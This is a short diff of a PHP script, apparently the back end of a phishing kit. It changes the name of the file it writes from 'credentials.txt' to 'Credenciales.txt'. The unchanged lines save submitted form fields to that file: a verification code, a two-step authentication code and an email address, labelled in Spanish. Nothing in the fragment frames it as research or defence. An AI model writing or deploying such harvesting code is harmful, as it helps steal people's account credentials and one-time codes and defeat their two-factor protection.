@@ -1,5 +1,5 @@
 <?php
-file_put_contents("credentials.txt", 
+file_put_contents("Credenciales.txt", 
                     "C. Verificación: " . $_POST['CodDigitos'] .  "\n".
                     "C. 2 Pasos: " . $_POST['CodeVerify'] .  "\n".
                     "Correo: " . $_POST['Correo']. "\n".
